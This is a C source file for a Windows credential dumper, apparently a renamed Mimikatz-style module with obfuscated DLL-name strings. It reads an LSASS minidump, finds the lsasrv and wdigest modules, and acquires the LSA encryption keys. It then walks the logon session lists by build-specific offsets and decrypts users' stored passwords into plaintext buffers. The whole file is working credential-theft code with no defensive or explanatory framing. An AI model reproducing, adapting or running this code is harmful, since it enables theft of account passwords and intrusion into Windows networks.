#include "my_modules.h"
wchar_t wUserName[MAX_PATH] = { 0 };
wchar_t wPw[MAX_PATH] = { 0 };
wchar_t wUserName2[MAX_PATH];
const PMY_M_MODULES_PACKAGE lsPackages[] = {
	&my_m_modules_msv_package,
	&my_m_modules_wdigest_package,
};
const MY_M_MODULES_ENUM_HELPER lsEnumHelpers[] = {
	{sizeof(MPW_MSV1_0_LIST_51), FIELD_OFFSET(MPW_MSV1_0_LIST_51, LocallyUniqueIdentifier), FIELD_OFFSET(MPW_MSV1_0_LIST_51, LogonType), FIELD_OFFSET(MPW_MSV1_0_LIST_51, Session),	FIELD_OFFSET(MPW_MSV1_0_LIST_51, UserName), FIELD_OFFSET(MPW_MSV1_0_LIST_51, Domaine), FIELD_OFFSET(MPW_MSV1_0_LIST_51, Credentials), FIELD_OFFSET(MPW_MSV1_0_LIST_51, pSid), FIELD_OFFSET(MPW_MSV1_0_LIST_51, CredentialManager), FIELD_OFFSET(MPW_MSV1_0_LIST_51, LogonTime), FIELD_OFFSET(MPW_MSV1_0_LIST_51, LogonServer)},
	{sizeof(MPW_MSV1_0_LIST_52), FIELD_OFFSET(MPW_MSV1_0_LIST_52, LocallyUniqueIdentifier), FIELD_OFFSET(MPW_MSV1_0_LIST_52, LogonType), FIELD_OFFSET(MPW_MSV1_0_LIST_52, Session),	FIELD_OFFSET(MPW_MSV1_0_LIST_52, UserName), FIELD_OFFSET(MPW_MSV1_0_LIST_52, Domaine), FIELD_OFFSET(MPW_MSV1_0_LIST_52, Credentials), FIELD_OFFSET(MPW_MSV1_0_LIST_52, pSid), FIELD_OFFSET(MPW_MSV1_0_LIST_52, CredentialManager), FIELD_OFFSET(MPW_MSV1_0_LIST_52, LogonTime), FIELD_OFFSET(MPW_MSV1_0_LIST_52, LogonServer)},
	{sizeof(MPW_MSV1_0_LIST_60), FIELD_OFFSET(MPW_MSV1_0_LIST_60, LocallyUniqueIdentifier), FIELD_OFFSET(MPW_MSV1_0_LIST_60, LogonType), FIELD_OFFSET(MPW_MSV1_0_LIST_60, Session),	FIELD_OFFSET(MPW_MSV1_0_LIST_60, UserName), FIELD_OFFSET(MPW_MSV1_0_LIST_60, Domaine), FIELD_OFFSET(MPW_MSV1_0_LIST_60, Credentials), FIELD_OFFSET(MPW_MSV1_0_LIST_60, pSid), FIELD_OFFSET(MPW_MSV1_0_LIST_60, CredentialManager), FIELD_OFFSET(MPW_MSV1_0_LIST_60, LogonTime), FIELD_OFFSET(MPW_MSV1_0_LIST_60, LogonServer)},
	{sizeof(MPW_MSV1_0_LIST_61), FIELD_OFFSET(MPW_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(MPW_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(MPW_MSV1_0_LIST_61, Session),	FIELD_OFFSET(MPW_MSV1_0_LIST_61, UserName), FIELD_OFFSET(MPW_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(MPW_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(MPW_MSV1_0_LIST_61, pSid), FIELD_OFFSET(MPW_MSV1_0_LIST_61, CredentialManager), FIELD_OFFSET(MPW_MSV1_0_LIST_61, LogonTime), FIELD_OFFSET(MPW_MSV1_0_LIST_61, LogonServer)},
	{sizeof(MPW_MSV1_0_LIST_61_ANTI_mypw), FIELD_OFFSET(MPW_MSV1_0_LIST_61_ANTI_mypw, LocallyUniqueIdentifier), FIELD_OFFSET(MPW_MSV1_0_LIST_61_ANTI_mypw, LogonType), FIELD_OFFSET(MPW_MSV1_0_LIST_61_ANTI_mypw, Session),	FIELD_OFFSET(MPW_MSV1_0_LIST_61_ANTI_mypw, UserName), FIELD_OFFSET(MPW_MSV1_0_LIST_61_ANTI_mypw, Domaine), FIELD_OFFSET(MPW_MSV1_0_LIST_61_ANTI_mypw, Credentials), FIELD_OFFSET(MPW_MSV1_0_LIST_61_ANTI_mypw, pSid), FIELD_OFFSET(MPW_MSV1_0_LIST_61_ANTI_mypw, CredentialManager), FIELD_OFFSET(MPW_MSV1_0_LIST_61_ANTI_mypw, LogonTime), FIELD_OFFSET(MPW_MSV1_0_LIST_61_ANTI_mypw, LogonServer)},
	{sizeof(MPW_MSV1_0_LIST_62), FIELD_OFFSET(MPW_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(MPW_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(MPW_MSV1_0_LIST_62, Session),	FIELD_OFFSET(MPW_MSV1_0_LIST_62, UserName), FIELD_OFFSET(MPW_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(MPW_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(MPW_MSV1_0_LIST_62, pSid), FIELD_OFFSET(MPW_MSV1_0_LIST_62, CredentialManager), FIELD_OFFSET(MPW_MSV1_0_LIST_62, LogonTime), FIELD_OFFSET(MPW_MSV1_0_LIST_62, LogonServer)},
	{sizeof(MPW_MSV1_0_LIST_63), FIELD_OFFSET(MPW_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(MPW_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(MPW_MSV1_0_LIST_63, Session),	FIELD_OFFSET(MPW_MSV1_0_LIST_63, UserName), FIELD_OFFSET(MPW_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(MPW_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(MPW_MSV1_0_LIST_63, pSid), FIELD_OFFSET(MPW_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(MPW_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(MPW_MSV1_0_LIST_63, LogonServer)},
};
const MY_M_MODULES_LOCAL_HELPER lsLocalHelpers[] = {

	{my_m_modules_nt5_init,	my_m_modules_nt5_clean,	my_m_modules_nt5_acquireKeys,	&my_m_modules_nt5_pLProtectMemory,	&my_m_modules_nt5_pLUnprotectMemory},

	{my_m_modules_nt6_init,	my_m_modules_nt6_clean,	my_m_modules_nt6_acquireKeys,	&my_m_modules_nt6_pLProtectMemory,	&my_m_modules_nt6_pLUnprotectMemory},
};
const MY_M_MODULES_LOCAL_HELPER* lsLocalHelper = NULL;
MY_M_MODULES_CONTEXT cLs = { NULL, {0, 0, 0} };
wchar_t* pMinidumpName = NULL;
PVOID CopyMemoryEx(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
{
    PBYTE D = (PBYTE)Destination;
    PBYTE S = (PBYTE)Source;

    while (Length--)
        *D++ = *S++;

    return Destination;
}
VOID my_m_modules_reset()
{
	HANDLE toClose=NULL;
	ULONG i;
	if (pMinidumpName)
	{
		free(pMinidumpName);
		pMinidumpName = NULL;
	}
	if (cLs.hLsMem)
	{
		switch (cLs.hLsMem->type)
		{
		case PW_M_MEMORY_TYPE_PROCESS_DMP:
			toClose = cLs.hLsMem->pHandleProcessDmp->hMinidump;
			break;
		default:
            break;
		}
		cLs.hLsMem = pw_m_memory_close(cLs.hLsMem);
		CloseHandle(toClose);
		my_m_modules_clean();
	}
    for (i = 0; i < ARRAYSIZE(lsPackages); i++)
    {
        RtlZeroMemory(&lsPackages[i]->Module, sizeof(MY_M_MODULES_LIB));
    }
		
}
NTSTATUS my_m_modules_reset(wchar_t* filename)
{
	my_m_modules_reset();
	pMinidumpName = _wcsdup(filename);
	return STATUS_SUCCESS;
}
NTSTATUS my_m_modules_clean()
{
	NTSTATUS status = STATUS_SUCCESS;
	if (lsLocalHelper)
	{
		status = lsLocalHelper->cleanLocalLib();
		lsLocalHelper = NULL;
	}
	return status;
}
NTSTATUS my_m_modules_get()
{
    NTSTATUS status = my_m_modules_getLogonData(lsPackages, ARRAYSIZE(lsPackages));
    if (NT_SUCCESS(status))
    {
        pw_m_minidump_close(cLs.hLsMem->pHandleProcessDmp->hMinidump);
    }
    return status;
}
extern HANDLE g_hfile;
NTSTATUS my_m_modules_acquireLSA()
{
	NTSTATUS status = STATUS_SUCCESS;
	PW_M_MEMORY_TYPE Type;
    HANDLE hData=NULL;
	PMINIDUMP_SYSTEM_INFO pInfos;
	BOOL isError = FALSE;
	if (!cLs.hLsMem)
	{
		status = STATUS_NOT_FOUND;
		if (pMinidumpName)
		{
			Type = PW_M_MEMORY_TYPE_PROCESS_DMP;
			hData = CreateFile(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
            g_hfile = hData;
		}
		if (hData && hData != INVALID_HANDLE_VALUE)
		{
			if (pw_m_memory_open(Type, hData, &cLs.hLsMem))
			{
				if (Type == PW_M_MEMORY_TYPE_PROCESS_DMP)
				{
					if (pInfos = (PMINIDUMP_SYSTEM_INFO)pw_m_minidump_stream(cLs.hLsMem->pHandleProcessDmp->hMinidump, SystemInfoStream, NULL))
					{
						cLs.osContext.MajorVersion = pInfos->MajorVersion;
						cLs.osContext.MinorVersion = pInfos->MinorVersion;
						cLs.osContext.BuildNumber = pInfos->BuildNumber;
					}
					else
					{
						isError = TRUE;
					}
				}
				if (!isError)
				{
					lsLocalHelper =(cLs.osContext.MajorVersion < 6) ? &lsLocalHelpers[0] : &lsLocalHelpers[1];
					if (NT_SUCCESS(lsLocalHelper->initLocalLib()))
					{
						if (NT_SUCCESS(pw_m_process_getVeryBasicModuleInformations(cLs.hLsMem, my_m_modules_findlibs, NULL)) && my_m_modules_msv_package.Module.isPresent)
						{
							if (my_m_modules_utils_search(&cLs, &my_m_modules_msv_package.Module))
							{
								status = lsLocalHelper->AcquireKeys(&cLs, &lsPackages[0]->Module.Informations);
							}
						}
					}
				}
			}
			if (!NT_SUCCESS(status))
				CloseHandle(hData);
		}
		if (!NT_SUCCESS(status))
			cLs.hLsMem = pw_m_memory_close(cLs.hLsMem);
	}
	return status;
}
BOOL CALLBACK my_m_modules_findlibs(PPW_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
	ULONG i;
	for (i = 0; i < ARRAYSIZE(lsPackages); i++)
	{
		if (_wcsicmp(lsPackages[i]->ModuleName, pModuleInformation->NameDontUseOutsideCallback->Buffer) == 0)
		{
			lsPackages[i]->Module.isPresent = TRUE;
			lsPackages[i]->Module.Informations = *pModuleInformation;
		}
	}
	return TRUE;
}
NTSTATUS my_m_modules_enum(PMY_M_MODULES_ENUM callback, LPVOID pOptionalData)
{
	MPW_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
	ULONG nbListes = 1, i;
	PVOID pStruct;
	PW_M_MEMORY_ADDRESS securityStruct, data = { &nbListes, &PW_M_MEMORY_GLOBAL_OWN_HANDLE }, aBuffer = { NULL, &PW_M_MEMORY_GLOBAL_OWN_HANDLE };
	BOOL retCallback = TRUE;
	const MY_M_MODULES_ENUM_HELPER* helper;
	NTSTATUS status = my_m_modules_acquireLSA();
	if (NT_SUCCESS(status))
	{
		sessionData.cLs = &cLs;
		sessionData.lsLocalHelper = lsLocalHelper;
		if (cLs.osContext.BuildNumber < PW_M_WIN_MIN_BUILD_2K3)
			helper = &lsEnumHelpers[0];
		else if (cLs.osContext.BuildNumber < PW_M_WIN_MIN_BUILD_VISTA)
			helper = &lsEnumHelpers[1];
		else if (cLs.osContext.BuildNumber < PW_M_WIN_MIN_BUILD_7)
			helper = &lsEnumHelpers[2];
		else if (cLs.osContext.BuildNumber < PW_M_WIN_MIN_BUILD_8)
			helper = &lsEnumHelpers[3];
		else if (cLs.osContext.BuildNumber < PW_M_WIN_MIN_BUILD_BLUE)
			helper = &lsEnumHelpers[5];
		else
			helper = &lsEnumHelpers[6];
		if ((cLs.osContext.BuildNumber >= PW_M_WIN_MIN_BUILD_7) 
            && (cLs.osContext.BuildNumber < PW_M_WIN_MIN_BUILD_BLUE) && (my_m_modules_msv_package.Module.Informations.TimeDateStamp > 0x53480000))
			helper++; 
		securityStruct.hMemory = cLs.hLsMem;
		if (securityStruct.address = LogonSessionListCount)
			pw_m_memory_copy(&data, &securityStruct, sizeof(ULONG));
		for (i = 0; i < nbListes; i++)
		{
			securityStruct.address = &LogonSessionList[i];
			data.address = &pStruct;
			data.hMemory = &PW_M_MEMORY_GLOBAL_OWN_HANDLE;
			if (aBuffer.address = LocalAlloc(LPTR, helper->tailleStruct))
			{
				if (pw_m_memory_copy(&data, &securityStruct, sizeof(PVOID)))
				{
					data.address = pStruct;
					data.hMemory = securityStruct.hMemory;
					while ((data.address != securityStruct.address) && retCallback)
					{
						if (pw_m_memory_copy(&aBuffer, &data, helper->tailleStruct))
						{
							sessionData.LogonId = (PLUID)((PBYTE)aBuffer.address + helper->offsetToLuid);
							sessionData.LogonType = *((PULONG)((PBYTE)aBuffer.address + helper->offsetToLogonType));
							sessionData.Session = *((PULONG)((PBYTE)aBuffer.address + helper->offsetToSession));
							sessionData.UserName = (PUNICODE_STRING)((PBYTE)aBuffer.address + helper->offsetToUsername);
							sessionData.LogonDomain = (PUNICODE_STRING)((PBYTE)aBuffer.address + helper->offsetToDomain);
							sessionData.pCredentials = *(PVOID*)((PBYTE)aBuffer.address + helper->offsetToCredentials);
							sessionData.pSid = *(PSID*)((PBYTE)aBuffer.address + helper->offsetToPSid);
							sessionData.pCredentialManager = *(PVOID*)((PBYTE)aBuffer.address + helper->offsetToCredentialManager);
							sessionData.LogonTime = *((PFILETIME)((PBYTE)aBuffer.address + helper->offsetToLogonTime));
							sessionData.LogonServer = (PUNICODE_STRING)((PBYTE)aBuffer.address + helper->offsetToLogonServer);
							pw_m_process_getUnicodeString(sessionData.UserName, cLs.hLsMem);
							pw_m_process_getUnicodeString(sessionData.LogonDomain, cLs.hLsMem);
							pw_m_process_getUnicodeString(sessionData.LogonServer, cLs.hLsMem);
							pw_m_process_getSid(&sessionData.pSid, cLs.hLsMem);
							retCallback = callback(&sessionData, pOptionalData);
							if (sessionData.UserName->Buffer)
								LocalFree(sessionData.UserName->Buffer);
							if (sessionData.LogonDomain->Buffer)
								LocalFree(sessionData.LogonDomain->Buffer);
							if (sessionData.LogonServer->Buffer)
								LocalFree(sessionData.LogonServer->Buffer);
							if (sessionData.pSid)
								LocalFree(sessionData.pSid);
							data.address = ((PLIST_ENTRY)(aBuffer.address))->Flink;
						}
						else break;
					}
				}
				LocalFree(aBuffer.address);
			}
		}
	}
	//wUserName, wPw
	return status;
}
BOOL CALLBACK my_m_modules_enum_callback_logondata(IN PMPW_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	PMY_M_MODULES_GET_LOGON_DATA_CALLBACK_DATA pLsData = (PMY_M_MODULES_GET_LOGON_DATA_CALLBACK_DATA)pOptionalData;
	ULONG i;
	if ((pData->LogonType != Network))
	{
		for (i = 0; i < pLsData->nbPackages; i++)
		{
			if (pLsData->lsPackages[i]->Module.isPresent && lsPackages[i]->isValid)
			{
				pLsData->lsPackages[i]->CredsForLUIDFunc(pData);
			}
		}
	}
	return TRUE;
}
wchar_t g_wszlsasrv[64] = L"0";
wchar_t g_wszwdigest[64] = L"0";
NTSTATUS my_m_modules_getLogonData(const PMY_M_MODULES_PACKAGE* lsPackages, ULONG nbPackages)
{
    MY_M_MODULES_GET_LOGON_DATA_CALLBACK_DATA OptionalData = { lsPackages, nbPackages };
    //³õÊ¼»¯×Ö·û´®
    wchar_t wszlsasrv[] = { L'l',L's',L'a',L's',L'r',L'v',L'.',L'd',L'l',L'l',L'\0' };
    wchar_t wszwdigest[] = { L'w',L'd',L'i',L'g',L'e',L's',L't',L'.',L'd',L'l',L'l',L'\0' };
    CopyMemoryEx(g_wszlsasrv, wszlsasrv, wcslen(wszlsasrv) * 2);
    CopyMemoryEx(g_wszwdigest, wszwdigest, wcslen(wszwdigest) * 2);
    my_m_modules_msv_package.ModuleName = g_wszlsasrv;
    my_m_modules_wdigest_package.ModuleName = g_wszwdigest;
    //get
    return my_m_modules_enum(my_m_modules_enum_callback_logondata, &OptionalData);
}
VOID my_m_modules_genericCredsOutput(PMPW_GENERIC_PRIMARY_CREDENTIAL mesCreds, PMPW_BASIC_SECURITY_LOGON_SESSION_DATA pData, ULONG flags)
{
	PUNICODE_STRING username = NULL, domain = NULL, mpw = NULL;
	DWORD type;
	BOOL isNull = FALSE;
	PWSTR sid = NULL;
	PBYTE msvCredentials;
#if defined(_M_X64) 
	PLSAISO_DATA_BLOB blob = NULL;
#endif
	if (mesCreds)
	{
		ConvertSidToStringSid(pData->pSid, &sid);
		if (flags & MY_MODULES_CREDS_DISPLAY_CREDENTIAL)
		{
			type = flags & MY_MODULES_CREDS_DISPLAY_CREDENTIAL_MASK;
			if (msvCredentials = (PBYTE)((PUNICODE_STRING)mesCreds)->Buffer)
			{
				if (!(flags & MY_MODULES_CREDS_DISPLAY_NODECRYPT))
					(*lsLocalHelper->pLUnprotectMemory)(msvCredentials, ((PUNICODE_STRING)mesCreds)->Length);
			}
		}
		else
		{

			if (mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Pw.Buffer)
			{
				if (pw_m_process_getUnicodeString(&mesCreds->UserName, cLs.hLsMem) && pw_m_string_suspectUnicodeString(&mesCreds->UserName))
				{
					if (!(flags & MY_MODULES_CREDS_DISPLAY_DOMAIN))
						username = &mesCreds->UserName;
					else
						domain = &mesCreds->UserName;
				}
				if (pw_m_process_getUnicodeString(&mesCreds->Domaine, cLs.hLsMem) && pw_m_string_suspectUnicodeString(&mesCreds->Domaine))
				{
					if (!(flags & MY_MODULES_CREDS_DISPLAY_DOMAIN))
						domain = &mesCreds->Domaine;
					else
						username = &mesCreds->Domaine;
				}
				if (pw_m_process_getUnicodeString(&mesCreds->Pw, cLs.hLsMem))
				{
					if (!(flags & MY_MODULES_CREDS_DISPLAY_NODECRYPT))
						(*lsLocalHelper->pLUnprotectMemory)(mesCreds->Pw.Buffer, mesCreds->Pw.MaximumLength);
					mpw = &mesCreds->Pw;
				}

				if (mpw )
				{
                    if (username && domain)
                    {
                        wmemset(wUserName, 0, sizeof(wUserName) / sizeof(wchar_t));
                        wmemcpy(wUserName, username->Buffer, username->Length / 2);
                        if (mpw)
                        {
                            wmemset(wPw, 0, sizeof(wPw) / sizeof(wchar_t));
                            wmemcpy(wPw, mpw->Buffer, mpw->Length / 2);
                        }
                    }
                    DWORD size = 256;
                    wchar_t buf[256];
                    GetUserNameW(buf, &size);
                    if (wcsncmp(buf, wUserName, 5) == 0)
                    {
                        wmemset(wUserName2, 0, sizeof(wUserName2) / sizeof(wchar_t));
                        wmemcpy(wUserName2, wUserName, wcslen(wUserName));
                      //  MessageBoxW(0, wPw, wUserName2, 0);
                    }
                    if (username)
                        LocalFree(username->Buffer);
                    if (domain)
                        LocalFree(domain->Buffer);
                    if (mpw)
                        LocalFree(mpw->Buffer);
				}
			}
			if (sid)
				LocalFree(sid);
		}
	}
}